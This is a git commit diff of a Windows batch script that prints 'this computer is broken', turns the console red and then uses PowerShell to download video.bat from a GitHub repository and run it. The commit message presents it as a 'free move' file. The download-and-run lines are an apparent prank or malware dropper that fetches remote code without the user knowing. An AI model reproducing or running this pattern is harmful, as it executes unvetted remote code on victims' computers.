b7c7fe10cacb85a833daa52ccf8cefa208a1a647
LKR-beta <gbu23224@gmail.com>
2024-09-19 16:04:22 +0900

    free_move_onlyPC.bat

--- bn.bat
+++ bn.bat
@@ -1,23 +1,18 @@
 @echo off 
 cls
 
-timeout /t 1000 /nobreak > NUL
-
 echo in %date%  %time%
 
 timeout /t 2 /nobreak > NUL
 
 echo this computer is broken
 
-timeout /t 3 /nobreak > NUL
+timeout /t 2 /nobreak > NUL
 
 color 4
 
 echo by lkr
 
-goto hate
-
-:hate
 powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/video.bat','C:\your\asylum\video.bat')"
 
 start video.bat
